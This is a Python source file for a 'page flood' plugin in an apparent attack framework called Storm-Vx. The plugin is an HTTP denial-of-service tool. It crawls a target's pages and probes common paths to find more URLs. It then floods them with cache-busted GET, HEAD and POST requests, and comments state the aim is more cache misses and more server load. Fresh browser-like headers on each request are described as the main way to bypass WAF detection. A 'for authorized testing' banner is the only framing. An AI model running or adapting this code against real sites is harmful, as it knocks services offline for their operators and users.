#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_page_flood — Page Flood Attack Plugin (v24 P0)

Sends rapid GET requests to page targets with cache busting.
v24: Enhanced with target diversity engine — auto-discovers endpoints
from HTML, probes common paths, and rotates between diverse URLs
to maximize cache misses and server processing.

Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
import re
from typing import Dict, Any, List, Set
from urllib.parse import urlparse, quote

import aiohttp


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin, ResponseClass
from vf_common import C, rand_cache_bust, rand_str
from vf_validator import sanitize_path
from utils.session_helpers import attack_timeout

from logging_config import get_logger
logger = get_logger(__name__)


__all__ = ["PageFloodPlugin"]


# ─── Common Path Probes (v24) ─────────────────────────────────────────────
# These are paths that often exist on web servers and generate
# server-side processing (not static files). Probing them adds
# more diverse targets = more cache misses = more server load.
COMMON_DYNAMIC_PATHS = [
    "/", "/index", "/home", "/search", "/about", "/contact",
    "/login", "/signup", "/register", "/forgot-password",
    "/dashboard", "/admin", "/profile", "/settings",
    "/api", "/api/v1", "/api/v2", "/graphql",
    "/sitemap.xml", "/robots.txt", "/favicon.ico",
    "/wp-login.php", "/wp-admin", "/xmlrpc.php",
    "/feed", "/rss", "/atom.xml",
    "/404", "/error", "/maintenance",
    "/status", "/health", "/ping",
    "/users", "/posts", "/articles", "/pages",
    "/cart", "/checkout", "/products",
    "/blog", "/news", "/forum",
    "/api/auth/me", "/api/user", "/api/config",
    "/server-status", "/server-info",
]

# Regex to extract URLs from HTML
_LINK_RE = re.compile(r'href=["\']([^"\']+)["\']', re.IGNORECASE)
_ACTION_RE = re.compile(r'action=["\']([^"\']+)["\']', re.IGNORECASE)
_SRC_RE = re.compile(r'src=["\']([^"\']+)["\']', re.IGNORECASE)


class PageFloodPlugin(AttackPlugin):
    """Flood target pages with GET requests (v24: with target diversity).

    v24: Auto-discovers endpoints from initial HTML, probes common paths,
    and rotates between diverse URLs. More unique URLs = more cache misses
    = more server-side processing = higher impact per request.
    """

    meta = PluginMeta(
        name='page_flood',
        version='2.0.0',
        plugin_type='attack',
        description='Page flood — rapid GET requests with target diversity and cache busting',
        tags=['http', 'page', 'flood', 'cdn', 'discovery'],
        priority=10,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    def __init__(self) -> None:
        super().__init__()
        self._discovered_urls: List[str] = []
        # A5 FIX: Use asyncio.Event instead of bool to properly synchronize
        # workers. Previously, other workers could read _probe_done=True
        # before _discover_endpoints completed, getting empty URL list.
        self._probe_done: asyncio.Event = asyncio.Event()

    async def _discover_endpoints(self, context: AttackContext) -> List[str]:
        """v24: Auto-discover endpoints from initial HTML + common path probing.

        Returns list of validated URLs to use as attack targets.
        """
        _ssl = context.ssl_param

        discovered: Set[str] = set()
        base_pages = context.page_targets or [context.url]
        site_root = context.site_root

        # Phase 1: Extract links from HTML of known pages
        for page in base_pages[:3]:  # Only check top 3 pages to save time
            try:
                headers = dict(context.headers)
                async with context.session.get(page, headers=headers,
                                               ssl=_ssl, allow_redirects=True,
                                               timeout=attack_timeout(total=5)) as resp:
                    if resp.status == 200:
                        html = await resp.text(errors='ignore')
                        # Extract href links
                        for match in _LINK_RE.findall(html):
                            if match.startswith('/'):
                                discovered.add(f"{site_root}{match}")
                            elif match.startswith(site_root):
                                discovered.add(match)
                        # Extract form actions
                        for match in _ACTION_RE.findall(html):
                            if match.startswith('/'):
                                discovered.add(f"{site_root}{match}")
                            elif match.startswith(site_root):
                                discovered.add(match)
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                logger.debug(f"Page discovery request failed for {page}: {exc}")

        # Phase 2: Probe common dynamic paths (sample, not all)
        probe_paths = random.sample(COMMON_DYNAMIC_PATHS,
                                    min(20, len(COMMON_DYNAMIC_PATHS)))
        for path in probe_paths:
            url = f"{site_root}{path}"
            try:
                headers = dict(context.headers)
                async with context.session.get(url, headers=headers,
                                               ssl=_ssl, allow_redirects=False,
                                               timeout=attack_timeout(total=3)) as resp:
                    # Any non-404 response means the path exists
                    if resp.status != 404:
                        discovered.add(url)
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                logger.debug(f"Path probe failed for {url}: {exc}")

        # Always include the original pages
        for page in base_pages:
            discovered.add(page)

        # A2 FIX: Sanitize paths of discovered URLs to prevent
        # path traversal attacks via attacker-controlled HTML links
        # BUG-FIX v32: Also strip fragments and re-encode paths to prevent
        # InvalidUrlClientError from spaces/unencoded characters.
        validated: Set[str] = set()
        for url in discovered:
            parsed_url = urlparse(url)
            safe_path = sanitize_path(parsed_url.path or '/')
            # BUG-FIX v32: Re-encode the path to ensure spaces and other
            # special characters are properly percent-encoded after
            # sanitize_path() decoded them via unquote().
            safe_path = quote(safe_path, safe='/:@!$&\'()*+,;=-._~')
            # BUG-FIX v32: Strip fragment (#) so cache-busting query params
            # are placed correctly (not after the fragment)
            url = parsed_url._replace(path=safe_path, fragment='').geturl()
            validated.add(url)
        discovered = validated

        result = list(discovered)
        if len(result) > len(base_pages):
            print(f"  {C.G}[PAGE-FLOOD] Discovered {len(result)} unique targets (was {len(base_pages)}){C.RS}")
        else:
            print(f"  {C.Y}[PAGE-FLOOD] No extra targets found, using {len(base_pages)} base targets{C.RS}")

        return result

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """Page flood worker: GET requests with cache busting and target diversity."""
        pages = context.page_targets or [context.url]
        cache_bust = context.extra.cache_bust
        delay_ms = context.extra.delay_ms

        _ssl = context.ssl_param

        # v24: First worker discovers endpoints, others wait for completion
        # A5 FIX: Use asyncio.Event.wait() instead of checking a bool flag.
        # Workers now properly wait until discovery completes instead of
        # potentially proceeding with an empty URL list.
        if worker_id == 0 and not self._probe_done.is_set():
            self._discovered_urls = await self._discover_endpoints(context)
            self._probe_done.set()  # Signal other workers that discovery is done
        elif not self._probe_done.is_set():
            # Wait for worker 0 to finish discovery (with timeout)
            try:
                await asyncio.wait_for(self._probe_done.wait(), timeout=30.0)
            except asyncio.TimeoutError:
                logger.warning(f"Worker {worker_id}: discovery timeout, using base pages")

        # Use discovered URLs if available, otherwise use base pages
        targets = self._discovered_urls if self._discovered_urls else pages

        # v24: Method rotation — mostly GET, occasionally HEAD/POST for diversity
        methods = ["GET"] * 85 + ["HEAD"] * 10 + ["POST"] * 5

        while not self._stop_event.is_set():
            try:
                url = random.choice(targets)
                if cache_bust:
                    url += f"{'&' if '?' in url else '?'}{rand_cache_bust()}"

                method = random.choice(methods)

                # v25 P1: Use evasion-aware fresh headers for EVERY request
                # This is the #1 factor in WAF bypass — each request looks like
                # a different browser. Without this, page_flood sends identical
                # headers to every request = easy WAF detection.
                headers = self._get_fresh_headers(context, "document")

                t = time.monotonic()
                try:
                    if method == "GET":
                        async with context.session.get(url, headers=headers,
                                                       ssl=_ssl, allow_redirects=False) as resp:
                            rt = time.monotonic() - t
                            resp_headers = dict(resp.headers)
                            response_class = self._process_response(resp.status, resp_headers, url=url[:60], worker_id=worker_id)
                            ok = response_class in (ResponseClass.OK, ResponseClass.AUTH_REQUIRED, ResponseClass.REDIRECT)
                            self._capture_response_cookies(resp, context)
                            await self._record("PAGE", ok, resp.status, rt, url=url[:60])
                    elif method == "HEAD":
                        async with context.session.head(url, headers=headers,
                                                        ssl=_ssl, allow_redirects=False) as resp:
                            rt = time.monotonic() - t
                            resp_headers = dict(resp.headers)
                            response_class = self._process_response(resp.status, resp_headers, url=url[:60], worker_id=worker_id)
                            ok = response_class in (ResponseClass.OK, ResponseClass.AUTH_REQUIRED, ResponseClass.REDIRECT)
                            await self._record("PAGE", ok, resp.status, rt, url=url[:60])
                    else:  # POST
                        # BUG-015: Set Content-Type for POST form data
                        headers["Content-Type"] = "application/x-www-form-urlencoded"
                        async with context.session.post(url, headers=headers,
                                                        data=f"q={rand_str(8)}",
                                                        ssl=_ssl, allow_redirects=False) as resp:
                            rt = time.monotonic() - t
                            resp_headers = dict(resp.headers)
                            response_class = self._process_response(resp.status, resp_headers, url=url[:60], worker_id=worker_id)
                            ok = response_class in (ResponseClass.OK, ResponseClass.AUTH_REQUIRED, ResponseClass.REDIRECT)
                            self._capture_response_cookies(resp, context)
                            await self._record("PAGE", ok, resp.status, rt, url=url[:60])
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                    rt = time.monotonic() - t
                    self._on_request_result(worker_id, False)
                    await self._record("PAGE", False, 0, rt,
                                       err=type(exc).__name__, url=url[:60])

                # v25 P1: Adaptive sleep with backoff
                await self._adaptive_sleep(worker_id, delay_ms)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                self._on_request_result(worker_id, False)
                await self._record("PAGE", False, 0, 0, err=type(exc).__name__)
                await asyncio.sleep(0.1)


